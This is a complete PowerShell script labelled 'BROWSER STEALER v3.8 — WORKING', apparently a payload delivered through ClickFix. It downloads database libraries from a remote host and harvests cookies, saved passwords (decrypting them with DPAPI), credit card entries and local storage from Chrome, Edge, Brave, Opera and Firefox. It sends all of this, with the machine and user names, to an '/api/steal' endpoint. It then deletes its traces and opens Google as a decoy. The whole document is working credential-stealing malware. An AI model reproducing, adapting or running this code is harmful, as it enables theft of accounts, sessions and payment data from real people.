# ============================================================
# BROWSER STEALER v3.8 — WORKING
# ============================================================

$ErrorActionPreference = "Continue"

$BASE_URL = "https://cipheranon-production.up.railway.app"
$SERVER_URL = "$BASE_URL/api/steal"
$DLL_DIR = "$env:TEMP\stealer_dlls"
$LOGFILE = "$env:TEMP\stealer_log.txt"

$SQLITE_DLL_URL = "$BASE_URL/System.Data.SQLite.dll"
$LEVELDB_DLL_URL = "$BASE_URL/LevelDB.netAll.dll"
$LEVELDB_NATIVE_URL = "$BASE_URL/leveldb.dll"

Remove-Item $LOGFILE -Force -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Path $DLL_DIR -Force -ErrorAction SilentlyContinue | Out-Null

function Write-Log {
    param($Msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Msg"
    Add-Content -Path $LOGFILE -Value $line
    Write-Host $Msg
}

Write-Log "============================================"
Write-Log "BROWSER STEALER v3.8"
Write-Log "Target: $env:COMPUTERNAME"
Write-Log "Log: $LOGFILE"
Write-Log "============================================"

function Download-Dll {
    param($Url, $Path, $Name)
    Write-Log "Downloading $Name..."
    try {
        $response = Invoke-WebRequest -Uri $Url -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -UseBasicParsing
        [System.IO.File]::WriteAllBytes($Path, $response.Content)
        Write-Log "$Name downloaded"
        return $true
    } catch {
        Write-Log "$Name failed: $_"
        return $false
    }
}

$sqlitePath = "$DLL_DIR\System.Data.SQLite.dll"
$sqliteOk = Download-Dll -Url $SQLITE_DLL_URL -Path $sqlitePath -Name "SQLite"
if (-not $sqliteOk) { exit }

$leveldbPath = "$DLL_DIR\LevelDB.netAll.dll"
$leveldbOk = Download-Dll -Url $LEVELDB_DLL_URL -Path $leveldbPath -Name "LevelDB.NET"
$leveldbNativePath = "$DLL_DIR\leveldb.dll"
$nativeOk = Download-Dll -Url $LEVELDB_NATIVE_URL -Path $leveldbNativePath -Name "LevelDB native"

$leveldbLoaded = ($leveldbOk -and $nativeOk)

Write-Log "Loading SQLite..."
try {
    [System.Reflection.Assembly]::LoadFrom($sqlitePath) | Out-Null
    Write-Log "SQLite loaded"
} catch {
    Write-Log "SQLite load failed: $_"
    exit
}

if ($leveldbLoaded) {
    Write-Log "Loading LevelDB..."
    try {
        [System.Reflection.Assembly]::LoadFrom($leveldbPath) | Out-Null
        Write-Log "LevelDB loaded"
    } catch {
        Write-Log "LevelDB load failed: $_"
        $leveldbLoaded = $false
    }
}

function Read-SQLite {
    param($DbPath, $Query)
    $result = @()
    if (-not (Test-Path $DbPath)) { return $result }
    try {
        $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
        Copy-Item $DbPath $temp -Force
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = $Query
        $rdr = $cmd.ExecuteReader()
        while ($rdr.Read()) {
            $row = @{}
            for ($i=0; $i -lt $rdr.FieldCount; $i++) {
                $n = $rdr.GetName($i)
                $v = $rdr.GetValue($i)
                if ($v -ne $null) { $row[$n] = $v }
            }
            $result += $row
        }
        $rdr.Close()
        $conn.Close()
        Remove-Item $temp -Force -ErrorAction SilentlyContinue
    } catch {
        Write-Log "SQLite read error"
    }
    return $result
}

function Decrypt-BrowserPassword {
    param($EncryptedData)
    if (-not $EncryptedData) { return $null }
    if ($EncryptedData -isnot [byte[]]) { return $null }
    if ($EncryptedData.Length -eq 0) { return $null }
    try {
        Add-Type -AssemblyName System.Security
        $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($EncryptedData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
    } catch {
        try { return [System.Text.Encoding]::UTF8.GetString($EncryptedData) } catch { return $null }
    }
}

function Get-BrowserCookies {
    param($Path, $Name)
    $cookies = @()
    if (-not (Test-Path $Path)) { return $cookies }
    try {
        $rows = Read-SQLite -DbPath $Path -Query "SELECT host_key, name, value FROM cookies"
        foreach ($r in $rows) {
            if ($r['name'] -and $r['value']) {
                $d = $r['host_key']
                if ($d) { $d = $d -replace '^\.', '' } else { $d = "unknown" }
                $cookies += @{ domain = $d; name = $r['name']; value = $r['value']; browser = $Name }
            }
        }
    } catch {
        Write-Log "Error reading $Name cookies"
    }
    return $cookies
}

function Get-FirefoxCookies {
    $cookies = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\cookies.sqlite"
            if (Test-Path $f) {
                try {
                    $rows = Read-SQLite -DbPath $f -Query "SELECT host, name, value FROM moz_cookies"
                    foreach ($r in $rows) {
                        if ($r['name'] -and $r['value']) {
                            $dmn = $r['host']
                            if ($dmn) { $dmn = $dmn -replace '^\.', '' } else { $dmn = "unknown" }
                            $cookies += @{ domain = $dmn; name = $r['name']; value = $r['value']; browser = "Firefox" }
                        }
                    }
                } catch {
                    Write-Log "Error reading Firefox cookies"
                }
            }
        }
    }
    return $cookies
}

function Get-FirefoxLocalStorage {
    param($ProfPath)
    $storage = @{}
    $dbPath = "$ProfPath\webappsstore.sqlite"
    if (Test-Path $dbPath) {
        try {
            $rows = Read-SQLite -DbPath $dbPath -Query "SELECT scope, key, value FROM webappsstore2"
            foreach ($r in $rows) {
                if ($r['key'] -and $r['value']) { $storage[$r['key']] = $r['value'] }
            }
            Write-Log "Firefox LocalStorage: $($storage.Count) items"
        } catch {
            Write-Log "Error reading Firefox LocalStorage"
        }
    }
    return $storage
}

function Get-ChromeLocalStorage {
    param($Path, $Name)
    $storage = @{}
    if (-not $leveldbLoaded) { return $storage }
    $leveldbPath = "$Path\Local Storage\leveldb\"
    if (-not (Test-Path $leveldbPath)) { return $storage }
    Write-Log "Reading $Name LocalStorage..."
    try {
        $options = New-Object LevelDB.NET.Options
        $db = [LevelDB.NET.DB]::Open($leveldbPath, $options)
        $iterator = $db.CreateIterator()
        $iterator.SeekToFirst()
        while ($iterator.Next()) {
            $key = [System.Text.Encoding]::UTF8.GetString($iterator.Key())
            $value = [System.Text.Encoding]::UTF8.GetString($iterator.Value())
            $storage[$key] = $value
        }
        $iterator.Dispose()
        $db.Dispose()
        Write-Log "$Name LocalStorage: $($storage.Count) items"
    } catch {
        Write-Log "Error reading $Name LocalStorage: $_"
    }
    return $storage
}

function Get-BrowserPasswords {
    param($Path, $Name)
    $pass = @()
    if (-not (Test-Path $Path)) { return $pass }
    Write-Log "Reading $Name passwords..."
    try {
        $rows = Read-SQLite -DbPath $Path -Query "SELECT origin_url, username_value, password_value FROM logins"
        foreach ($r in $rows) {
            $username = $r['username_value']
            $encryptedPassword = $r['password_value']
            $decryptedPassword = $null
            if ($encryptedPassword -and $encryptedPassword -is [byte[]]) {
                $decryptedPassword = Decrypt-BrowserPassword -EncryptedData $encryptedPassword
            } elseif ($encryptedPassword -and $encryptedPassword -is [string]) {
                $decryptedPassword = $encryptedPassword
            }
            if (-not $decryptedPassword -and $encryptedPassword) {
                $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($encryptedPassword)
            }
            if ($username -and $decryptedPassword -and $username -ne "" -and $decryptedPassword -ne "") {
                $u = $r['origin_url']
                if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
                $pass += @{ name = $username; value = $decryptedPassword; type = "password"; url = $u; browser = $Name }
            }
        }
        Write-Log "Found $($pass.Count) $Name passwords"
    } catch {
        Write-Log "Error reading $Name passwords: $_"
    }
    return $pass
}

function Get-FirefoxPasswords {
    $pass = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\logins.json"
            if (Test-Path $f) {
                try {
                    $json = Get-Content $f -Raw | ConvertFrom-Json
                    if ($json.logins) {
                        foreach ($l in $json.logins) {
                            $u = $l.hostname -replace 'https?://', ''
                            if ($l.username -and $l.password -and $l.username -ne "" -and $l.password -ne "") {
                                $pass += @{ name = $l.username; value = $l.password; type = "password"; url = $u; browser = "Firefox" }
                            }
                        }
                    }
                } catch {
                    Write-Log "Error reading Firefox passwords"
                }
            }
        }
    }
    return $pass
}

function Get-OperaPasswords {
    $pass = @()
    $path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
    if (Test-Path $path) {
        $pass += Get-BrowserPasswords -Path $path -Name "Opera"
    }
    return $pass
}

function Get-BrowserCards {
    param($Path, $Name)
    $cards = @()
    if (-not (Test-Path $Path)) { return $cards }
    try {
        $rows = Read-SQLite -DbPath $Path -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
        foreach ($r in $rows) {
            if ($r['name_on_card'] -and $r['card_number_encrypted']) {
                $cards += @{ name = $r['name_on_card']; value = $r['card_number_encrypted']; type = "card-number"; url = $Name; browser = $Name; month = $r['expiration_month']; year = $r['expiration_year'] }
            }
        }
    } catch {
        Write-Log "Error reading $Name cards"
    }
    return $cards
}

function Get-FirefoxProfiles {
    $profiles = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $profiles += $d.FullName
        }
    }
    return $profiles
}

$allCookies = @()
$allPasswords = @()
$allCards = @()
$allLocalStorage = @{}

Write-Log ""
Write-Log "Chrome cookies..."
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Chrome"

Write-Log "Edge cookies..."
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Edge"

Write-Log "Brave cookies..."
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Brave"

Write-Log "Opera cookies..."
$path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Opera"

Write-Log "Firefox cookies..."
$allCookies += Get-FirefoxCookies

Write-Log "Chrome passwords..."
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Chrome"

Write-Log "Edge passwords..."
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Edge"

Write-Log "Brave passwords..."
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Brave"

Write-Log "Opera passwords..."
$allPasswords += Get-OperaPasswords

Write-Log "Firefox passwords..."
$allPasswords += Get-FirefoxPasswords

Write-Log "Chrome cards..."
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Chrome"

Write-Log "Edge cards..."
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Edge"

Write-Log "Brave cards..."
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Brave"

Write-Log ""
Write-Log "Chrome LocalStorage..."
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$chromeLs = Get-ChromeLocalStorage -Path $path -Name "Chrome"
foreach ($key in $chromeLs.Keys) {
    $allLocalStorage["Chrome:$key"] = $chromeLs[$key]
}

Write-Log "Edge LocalStorage..."
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
$edgeLs = Get-ChromeLocalStorage -Path $path -Name "Edge"
foreach ($key in $edgeLs.Keys) {
    $allLocalStorage["Edge:$key"] = $edgeLs[$key]
}

Write-Log "Brave LocalStorage..."
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
$braveLs = Get-ChromeLocalStorage -Path $path -Name "Brave"
foreach ($key in $braveLs.Keys) {
    $allLocalStorage["Brave:$key"] = $braveLs[$key]
}

Write-Log "Firefox LocalStorage..."
$profiles = Get-FirefoxProfiles
foreach ($prof in $profiles) {
    $ffLs = Get-FirefoxLocalStorage -ProfPath $prof
    foreach ($key in $ffLs.Keys) {
        $allLocalStorage["Firefox:$key"] = $ffLs[$key]
    }
}

Write-Log ""
Write-Log "============================================"
Write-Log "SUMMARY"
Write-Log "============================================"
Write-Log "Cookies: $($allCookies.Count)"
Write-Log "Passwords: $($allPasswords.Count)"
Write-Log "Cards: $($allCards.Count)"
Write-Log "LocalStorage: $($allLocalStorage.Count)"
Write-Log "============================================"

$pcName = $env:COMPUTERNAME
$userName = $env:USERNAME

$cookiesForServer = @{}
foreach ($c in $allCookies) {
    $key = $c.domain + "|" + $c.browser
    if (-not $cookiesForServer[$key]) {
        $cookiesForServer[$key] = @{}
    }
    $cookiesForServer[$key][$c.name] = $c.value
}

$localStorageForServer = @{}
foreach ($key in $allLocalStorage.Keys) {
    $localStorageForServer[$key] = $allLocalStorage[$key]
}

$payload = @{
    cookies = $cookiesForServer
    credentials = $allPasswords
    cards = $allCards
    localStorage = $localStorageForServer
    system = @{
        hostname = $pcName
        username = $userName
        os = (Get-WmiObject Win32_OperatingSystem).Caption
    }
    fingerprint = @{
        hostname = $pcName
        userAgent = "PowerShell Payload"
        browser = "PowerShell"
        screen = "N/A"
    }
    domain = $pcName
    browser = "PowerShell"
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    pcName = $pcName
    nonce = [System.Guid]::NewGuid().ToString()
}

Write-Log "Sending data..."
try {
    $json = $payload | ConvertTo-Json -Depth 10
    Write-Log "Payload size: $($json.Length) bytes"
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $req = [System.Net.WebRequest]::Create($SERVER_URL)
    $req.Method = "POST"
    $req.ContentType = "application/json"
    $req.ContentLength = $bytes.Length
    $stream = $req.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $resp = $req.GetResponse()
    $resp.Close()
    Write-Log "Data sent"
} catch {
    Write-Log "Send failed: $_"
}

Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
Remove-Item $DLL_DIR -Recurse -Force -ErrorAction SilentlyContinue

Start-Process "https://www.google.com"

Write-Log ""
Write-Log "Done!"
Write-Log "Log saved to: $LOGFILE"

exit
